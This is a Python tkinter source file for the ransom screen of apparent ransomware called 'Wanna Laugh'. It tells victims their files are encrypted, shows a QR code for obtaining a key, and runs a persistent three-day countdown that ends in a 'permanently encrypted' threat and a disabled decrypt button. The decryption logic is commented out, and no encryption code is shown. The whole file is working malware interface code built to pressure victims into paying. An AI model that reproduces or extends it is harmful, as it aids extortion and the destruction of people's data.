import tkinter as tk
from tkinter import Text, Button, Label
from PIL import Image, ImageTk
import datetime
import os
import sys

RED_BG = '#A0153E'
WHITE = '#EEEDED'

def resource_path(relative_path):
  try:
    base_path = sys._MEIPASS2
  except Exception:
    base_path = os.path.abspath(".")

  return os.path.join(base_path, relative_path)

def dec():
  # child screen
  noti_screen = tk.Toplevel()
  ico = Image.open(resource_path('assets/hacker.ico'))
  ico_photo = ImageTk.PhotoImage(ico)
  noti_screen.iconphoto(False, ico_photo)
  noti_screen.resizable(False, False)

  noti_label = tk.Label(
    master=noti_screen,
    text='All your files have been decrypted!!!', 
    font=40, 
    width=30, 
    height=10, 
    bg=RED_BG, 
    fg=WHITE
  )
  noti_label.pack()
  # with open('C:/Users/Public/Documents/DONT_DELETE.txt') as all_file_enc:
  #   # decrypt file
  #   for f in all_file_enc.readlines():
  #     dec.dec(filename=f.strip(), key=key)

def countdown(time):
  if time <= datetime.timedelta():
    dec_button["state"] = "disabled"
    time_label_countdown.config(text="Your files have been permanently encrypted")
  else:
    time_str = str(time).split('.')[0]
    time_label_countdown.config(text=time_str)
    root.after(1000, countdown, time - datetime.timedelta(seconds=1))

# Create the main window
root = tk.Tk()
root.title('Wanna Laugh')
root.wm_resizable(False, False)
root.configure(bg=RED_BG)

# Create a label in row 1
Label(root, text="Oops, Your files has been encrypted!!!", font=20, bg=RED_BG, fg=WHITE).grid(row=0, column=0)




# Create a new frame in row 2
frame = tk.Frame(root, bg=RED_BG)
frame.grid(row=1, column=0, pady=20)

# Add a QR code and a label to the frame
qr_frame = tk.Frame(frame)
qr_frame.grid(row=0, column=1)

Label(qr_frame, text="How to decode encrypted files?", font=5).grid(row=0, column=0)
Label(qr_frame, text="Don't worry, scan the code below and enter your email. We will send you a key to decode.", font=5).grid(row=1, column=0)
qr_code_image = Image.open("assets/qr.jpeg").resize((295, 292))  # replace with your image path
qr_code_photo = ImageTk.PhotoImage(qr_code_image)
Label(qr_frame, image=qr_code_photo).grid(row=2, column=0)
Label(qr_frame, text="NOTE: Enter your email EXACTLY", font=5).grid(row=3, column=0)

# banner frame
banner_frame = tk.Frame(frame, bg=RED_BG)
banner_frame.grid(row=0, column=0)
banner_image = Image.open("assets/banner.png").resize((300, 200))  # replace with your image path
banner_photo = ImageTk.PhotoImage(banner_image)
Label(banner_frame, image=banner_photo).grid(row=0, column=0)
Label(banner_frame, text="Time left", font=1).grid(row=1, column=0)
time_label_countdown = tk.Label(banner_frame, font=('Helvetica', 24), )
time_label_countdown.grid(row=2, column=0)

# Check if the end time is saved in a file
if os.path.exists('C:/Users/Public/Documents/end_time.txt'):
    with open('C:/Users/Public/Documents/end_time.txt', 'r') as f:
        end_time = datetime.datetime.strptime(f.read(), '%Y-%m-%d %H:%M:%S')
else:
    end_time = datetime.datetime.now() + datetime.timedelta(days=3)
    end_time = end_time.replace(microsecond=0)
    with open('C:/Users/Public/Documents/end_time.txt', 'w') as f:
        f.write(str(end_time))

time_left = end_time - datetime.datetime.now()
countdown(time_left)


# create footer in row 3
footer = tk.Frame(root)
footer.grid(row=2, column=0, pady=20)

Label(footer, text="INPUT KEY HERE!!", font=8).grid(row=0, column=0, padx=10, pady=10)
hehe = Text(footer, height=5)
hehe.grid(row=1, column=0, padx=10)

dec_button = Button(footer, text="Decrypt", border=1, background=RED_BG, fg=WHITE, font=5, command=dec)
dec_button.grid(row=1, column=1, padx=10)
# Start the main loop
root.mainloop()
